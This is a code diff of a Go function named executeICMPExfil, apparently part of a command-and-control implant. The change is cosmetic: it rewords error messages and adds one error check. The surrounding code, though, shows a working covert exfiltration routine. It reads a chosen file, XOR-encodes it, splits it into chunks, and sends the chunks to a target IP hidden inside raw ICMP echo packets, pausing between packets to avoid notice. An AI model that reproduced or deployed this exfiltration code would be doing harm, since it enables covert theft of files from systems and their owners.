@@ -53,10 +53,10 @@ func executeICMPExfil(task structs.Task) structs.CommandResult {
 	}
 
 	if args.Target == "" {
-		return errorResult("Error: target IP is required for ICMP exfiltration")
+		return errorResult("target IP is required for ICMP exfiltration")
 	}
 	if args.File == "" && args.Data == "" {
-		return errorResult("Error: file or data parameter is required")
+		return errorResult("file or data parameter is required")
 	}
 
 	// Defaults
@@ -85,7 +85,7 @@ func executeICMPExfil(task structs.Task) structs.CommandResult {
 	if args.File != "" {
 		data, err := os.ReadFile(args.File)
 		if err != nil {
-			return errorf("Error reading file: %v", err)
+			return errorf("reading file: %v", err)
 		}
 		payload = data
 		fileName = filepath.Base(args.File)
@@ -95,7 +95,7 @@ func executeICMPExfil(task structs.Task) structs.CommandResult {
 	}
 
 	if len(payload) == 0 {
-		return errorResult("Error: no data to exfiltrate (file is empty)")
+		return errorResult("no data to exfiltrate (file is empty)")
 	}
 
 	// XOR encode if key is set
@@ -113,14 +113,14 @@ func executeICMPExfil(task structs.Task) structs.CommandResult {
 	}
 	totalChunks := (len(payload) + dataChunkSize - 1) / dataChunkSize
 	if totalChunks > 65535 {
-		return errorf("Error: file too large (%d bytes, max ~%dMB with chunk size %d)",
+		return errorf("file too large (%d bytes, max ~%dMB with chunk size %d)",
 			len(payload), (65535*dataChunkSize)/(1024*1024), args.ChunkSize)
 	}
 
 	// Open raw ICMP connection
 	conn, err := net.Dial("ip4:icmp", args.Target)
 	if err != nil {
-		return errorf("Error opening ICMP socket: %v (requires root/admin)", err)
+		return errorf("opening ICMP socket: %v (requires root/admin)", err)
 	}
 	defer conn.Close()
 
@@ -158,7 +158,7 @@ func executeICMPExfil(task structs.Task) structs.CommandResult {
 
 		pkt := buildICMPEchoRequest(icmpExfilMagic, uint16(seq), pktPayload)
 		if _, err := conn.Write(pkt); err != nil {
-			return errorf("Error sending ICMP packet %d/%d: %v", seq+1, totalChunks, err)
+			return errorf("sending ICMP packet %d/%d: %v", seq+1, totalChunks, err)
 		}
 		result.SentPkts++
 
@@ -171,7 +171,10 @@ func executeICMPExfil(task structs.Task) structs.CommandResult {
 		time.Sleep(delay)
 	}
 
-	output, _ := json.Marshal(result)
+	output, err := json.Marshal(result)
+	if err != nil {
+		return errorf("failed to marshal result: %v", err)
+	}
 	return successResult(string(output))
 }
 
